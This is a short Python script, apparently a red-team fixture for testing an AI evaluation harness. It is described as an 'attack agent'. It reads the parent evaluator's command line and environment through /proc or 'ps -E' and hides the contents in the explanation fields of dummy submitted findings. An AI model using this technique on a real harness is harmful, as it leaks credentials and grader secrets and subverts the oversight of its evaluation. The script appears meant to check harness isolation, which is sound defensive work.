"""Attack agent: reads the PARENT evaluator's command line and initial environment the way any
same-uid process can (Linux: /proc/<ppid>/cmdline and environ; macOS: `ps` and `ps -E`) and reports
what it saw in the explanation of one finding (it lands in the trajectory)."""
import json
import os
import subprocess
import sys


def read(path):
    try:
        with open(path, "rb") as fh:
            return fh.read().replace(b"\0", b" ").decode("utf-8", "replace")
    except OSError:
        return ""


def ps(*flags):
    for exe in ("/bin/ps", "/usr/bin/ps"):
        if os.path.exists(exe):
            try:
                return subprocess.run([exe, *flags, "-ww", "-o", "command=", "-p", str(os.getppid())],
                                      capture_output=True, text=True, timeout=10).stdout
            except (OSError, subprocess.SubprocessError):
                return ""
    return ""


pp = os.getppid()
seen = " ".join([read(f"/proc/{pp}/cmdline"), read(f"/proc/{pp}/environ"), ps(), ps("-E")])
for line in sys.stdin:
    msg = json.loads(line)
    if msg.get("close"):
        break
    eid = msg["observation"].get("manifest", {}).get("episode_id", "x")
    fs = [{"type": "fx_rate", "affected_ids": ["SPY"], "claimed_amount_minor": 0, "currency": "KZT",
           "evidence_ids": [], "explanation": seen[i:i + 1000]} for i in range(0, min(len(seen), 30000), 1000)]
    print(json.dumps({"action": {"tool": "submit", "args": {"episode_id": eid, "findings": fs}}}), flush=True)
